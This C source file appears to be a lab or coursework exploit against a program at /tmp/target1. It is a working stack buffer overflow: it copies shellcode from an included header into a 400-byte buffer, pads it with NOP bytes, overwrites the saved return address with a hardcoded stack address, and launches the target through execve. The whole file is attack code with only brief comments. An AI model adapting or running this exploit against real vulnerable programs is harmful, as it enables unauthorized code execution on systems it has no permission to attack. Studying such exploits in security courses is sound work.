#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BUF_SIZE 400

 int main(void)
{
  char *args[3];
  char *env[1];
  
  args[0] = TARGET; 
  // buffer is 384 bytes long, want to overwrite
  char buf[BUF_SIZE];

  int index;
  
  // Insert Shellcode
  for(index = 0; index < sizeof(shellcode) - 1; index++){
      buf[index] = shellcode[index];
  }
  
  // fill buffer
  for(index; index < BUF_SIZE - 4; index++) {
      buf[index] = 0x90;
  }

  // this is where we overwrite the return address
  *((int *) (buf + index)) = 0xbffffb30;
  
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
} 

